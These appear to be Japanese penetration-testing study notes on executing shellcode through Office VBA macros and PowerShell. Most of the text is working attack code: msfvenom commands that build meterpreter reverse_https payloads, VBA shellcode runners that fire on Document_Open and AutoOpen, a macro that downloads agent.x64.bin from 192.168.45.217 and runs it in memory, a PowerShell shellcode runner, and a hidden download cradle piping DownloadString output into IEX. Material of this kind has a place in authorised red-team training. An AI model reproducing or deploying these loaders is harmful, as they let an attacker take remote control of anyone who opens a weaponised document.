## VBAでのシェルコード実行
### API呼び出し基礎
DLLに含まれるアンマネージドコードを`Declare`キーワードでリンクして使用
```vb
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
```

引数の型変換について以下のCのAPIプロトタイプを使う場合
```c
BOOL GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
```

ポインタと参照渡し
- `ByVal`：アドレスをそのまま値として渡す場合
- `ByRef`：ポインタとして渡す場合

例：
LPSTRは文字列へのポインタで、VBAのString型もポインタ -> `ByVal`を使う（`ByRef`使うとポインタのポインタになる）
LPDWORDは32bit整数のポインタで、VBAのLongは整数型 -> `ByRef`を使う

### シェルコードランナー
一般的なアプローチは`VirtualAlloc`,`RtlMoveMemory`,`CreateThread`を使用

msfvenomでのシェルコード作成
シェルコードを終了するときに、wordプロセス自体を終了しないようにthread実行にする
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication
```

```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    buf = Array(252,73,..)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```


ダウンローダ付き
adaptixc2はhttpペイロードしか無理っぽい
```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf() As Byte
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    Dim xhr As Object
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", "http://192.168.45.217:8000/agent.x64.bin", False
    xhr.setRequestHeader "Cache-Control", "no-cache"
    xhr.setRequestHeader "Pragma", "no-cache"
    xhr.Send
    buf = xhr.responseBody
    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
```
## Powershellでのシェルコード
### P/Invoke
powershellはC#を使え、C#はdllImportAttributeクラスでwin32APIを呼び出せる。
Microsoft's Platform Invocation Services(P/Invoke API)を使って呼び出す。

```
PowerShell
    ↓ Add-Type
C#クラスをコンパイル（.NETがやる）
    ↓ DllImport
Win32 API（user32.dll等）を呼び出す
```
### コード例
MessageBoxをP/InvvokeAPIを使って呼ぶ方法
```powershell
# Here-String (@" "@ ) でC#コードをブロックとして定義
# @" で開始、"@ で終了（必ず行頭に置く）
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
"@

Add-Type $User32

[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

GetDriveTypeWの例
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

publiac class Kernel32 {
	[DllImport("kernel32.dll", CharSet=CharSet.Auto)]
	public static extern DriveType GetDriveTypeW(string lpRootPathName);
}
"@

Add-Type $Kernel32
[Kernel32]::GetDriveTypeW("C:\")
```

### シェルコードランナー
msfvenomでのシェルコード生成
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1
```

bufのところに生成したbufを入れる
```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}}
"@
Add-Type $Kernel32

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0...

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

powershellを実行する手前のVBAのダウンロードクレードル
```vb
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://IP:PORT/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
